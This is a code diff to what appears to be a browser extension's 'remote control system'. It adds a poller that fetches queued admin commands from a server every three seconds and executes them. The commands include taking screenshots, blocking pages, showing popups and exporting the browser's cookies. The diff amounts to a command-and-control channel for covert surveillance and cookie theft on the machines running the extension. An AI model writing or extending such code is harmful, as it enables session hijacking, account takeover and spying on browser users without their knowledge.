@@ -654,10 +654,61 @@ async function processOfflineQueue() {
 // ============= REMOTE CONTROL SYSTEM =============
 
 // Initialize remote control WebSocket connection
+let commandQueuePollerInterval = null;
+
 async function initializeRemoteControl() {
   if (!machineId) return;
   connectToCommandServer();
   startSessionHeartbeat();
+  startCommandQueuePoller();
+}
+
+// Start polling command queue for pending commands (fallback for offline WebSocket)
+function startCommandQueuePoller() {
+  // Clear existing poller
+  if (commandQueuePollerInterval) {
+    clearInterval(commandQueuePollerInterval);
+  }
+  
+  log('info', '📋 Starting command queue poller (3s interval)');
+  
+  commandQueuePollerInterval = setInterval(async () => {
+    if (!machineId) return;
+    
+    try {
+      const response = await fetch(`${CONFIG.API_BASE}/command-queue`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+        },
+        body: JSON.stringify({ machine_id: machineId })
+      });
+      
+      if (!response.ok) {
+        throw new Error(`Queue poll failed: ${response.status}`);
+      }
+      
+      const { commands } = await response.json();
+      
+      if (commands && commands.length > 0) {
+        log('info', `📥 Received ${commands.length} queued commands`);
+        
+        for (const cmd of commands) {
+          await handleRemoteCommand({
+            type: 'remote_command',
+            command_id: cmd.command_id,
+            command_type: cmd.command_type,
+            target_tab_id: cmd.target_tab_id,
+            target_domain: cmd.target_domain,
+            payload: cmd.payload
+          });
+        }
+      }
+    } catch (error) {
+      log('debug', 'Queue poll error (normal if no commands):', error.message);
+    }
+  }, 3000); // Poll every 3 seconds
 }
 
 // Connect to command dispatcher WebSocket with improved reconnection and keep-alive
@@ -782,21 +833,27 @@ function connectToCommandServer() {
 
 // Handle remote commands from admin
 async function handleRemoteCommand(data) {
-  log('info', 'Received remote command', data);
+  log('info', 'Received remote command', { command_id: data.command_id, type: data.command_type });
   
-  switch (data.command_type) {
-    case 'popup':
-      await handlePopupCommand(data);
-      break;
-    case 'block':
-      await handleBlockCommand(data);
-      break;
-    case 'screenshot':
-      await handleScreenshotCommand(data);
-      break;
-    case 'export_cookies':
-      await handleExportCookiesCommand(data);
-      break;
+  try {
+    switch (data.command_type) {
+      case 'popup':
+        await handlePopupCommand(data);
+        break;
+      case 'block':
+        await handleBlockCommand(data);
+        break;
+      case 'screenshot':
+        await handleScreenshotCommand(data);
+        break;
+      case 'export_cookies':
+        await handleExportCookiesCommand(data);
+        break;
+    }
+    
+    log('info', `✅ Command ${data.command_id} executed successfully`);
+  } catch (error) {
+    log('error', `❌ Command ${data.command_id} execution failed`, error);
   }
 }
 
